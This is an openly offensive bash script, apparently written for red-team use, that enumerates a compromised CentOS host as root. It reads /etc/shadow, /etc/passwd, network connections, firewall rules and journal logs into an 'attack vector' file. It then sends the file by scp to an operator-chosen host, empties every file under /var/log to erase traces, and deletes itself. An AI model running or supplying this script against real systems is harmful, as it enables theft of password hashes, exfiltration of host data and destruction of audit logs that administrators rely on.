############################################################################
## Target Enumeration Script                                              ##
## Bash Script for CentOS                                                 ##
##                                                                        ##
## Author: Anna DeVries                                                   ##
## 6 April 2019                                                           ##
##                                                                        ##
## sudo ./centos_targetenum.sh                                            ##
############################################################################

#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Run again as root 'sudo ./centos_targetenum.sh'"
  exit
fi

echo -n "Title Enumeration File: "
read ans
echo $ans

echo -n "Usr Name: "
read ans1
echo $ans1

echo -n "Usr IP: "
read ans2
echo $ans2

echo "Target Enumeration Text File" &> ${ans}_centos_attack_vector.txt
echo " " &>>  ${ans}_centos_attack_vector.txt

echo "--------------------System Information--------------------" &>> ${ans}_centos_attack_vector.txt
cat /etc/centos-release &>> ${ans}_centos_attack_vector.txt
echo "IP Address: " &>> ${ans}_centos_attack_vector.txt
ip addr | grep "inet " &>> ${ans}_centos_attack_vector.txt
echo "Kernel Information: " &>> ${ans}_centos_attack_vector.txt
uname -a &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Services and Ports--------------------" &>> ${ans}_centos_attack_vector.txt
netstat -pan &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------User/Root Privs Information--------------------" &>> ${ans}_centos_attack_vector.txt
echo "Password: " &>> ${ans}_centos_attack_vector.txt
cat /etc/passwd &>> ${ans}_centos_attack_vector.txt
echo "Shadow: " &>> ${ans}_centos_attack_vector.txt
cat /etc/shadow &>> ${ans}_centos_attack_vector.txt
echo "Groups: " &>> ${ans}_centos_attack_vector.txt
cat /etc/group &>> ${ans}_centos_attack_vector.txt
echo "Logged in Users: " &>> ${ans}_centos_attack_vector.txt
who &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Firewall--------------------" &>> ${ans}_centos_attack_vector.txt
echo "IPTABLES: " &>> ${ans}_centos_attack_vector.txt
iptables -L &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt
echo "Firewalld: " &>> ${ans}_centos_attack_vector.txt
sudo firewall-cmd --zone=public --list-all &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Logs--------------------" &>> ${ans}_centos_attack_vector.txt
journalctl -xe &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "Target Enumeration Complete"
echo "Please move this off the box and share in Slack. 'scp ${ans}_centos_attack_vector.txt <dst@ip>:' "

scp ${ans}_centos_attack_vector.txt $ans1@$ans2:

rm -f ${ans}_centos_attack_vector.txt

for CLEAN in $(find /var/log/ -type f)
do
    cp /dev/null  $CLEAN
done

rm -f centos_targetenum.sh
